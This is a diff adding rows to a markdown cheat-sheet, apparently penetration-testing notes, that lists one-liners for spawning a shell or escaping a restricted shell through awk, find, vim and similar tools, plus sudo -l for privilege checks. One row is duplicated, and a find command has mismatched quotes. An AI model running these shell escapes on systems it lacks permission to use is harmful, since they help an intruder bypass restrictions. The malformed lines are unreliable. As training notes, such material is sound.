@@ -45,6 +45,13 @@ tags:
 | `perl —e 'exec "/bin/sh";'` | Uses `perl` to spawn an interactive shell on a linux-based system. |
 | `ruby: exec "/bin/sh"` | Uses `ruby` to spawn an interactive shell on a linux-based system. |
 | `Lua: os.execute('/bin/sh')` | Uses `Lua` to spawn an interactive shell on a linux-based system. |
+| `awk 'BEGIN {system("/bin/sh")}'` | Uses `awk` command to spawn an interactive shell on a linux-based system. |
+| `find / -name nameoffile 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;` | Uses `find` command to spawn an interactive shell on a linux-based system. |
+| `find . -exec /bin/sh \; -quit` | An alternative way to use the `find` command to spawn an interactive shell on a linux-based system. |
+| `vim -c ':!/bin/sh'` | Uses the text- editor `VIM` to spawn an interactive shell. Can be used to escape "jail- shells". |
+| `ls -la <path/to/fileorbinary>` | Used to `list` files & directories on a linux-based system and shows the permission for each file in the chosen directory. Can be used to look for binaries that we have permission to execute. |
+| `sudo -l` | Displays the commands that the currently logged on user can run as `sudo`. |
+| `find / -name nameoffile 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;` | Uses `find` command to spawn an interactive shell on a linux-based system. |
 
 
 ----
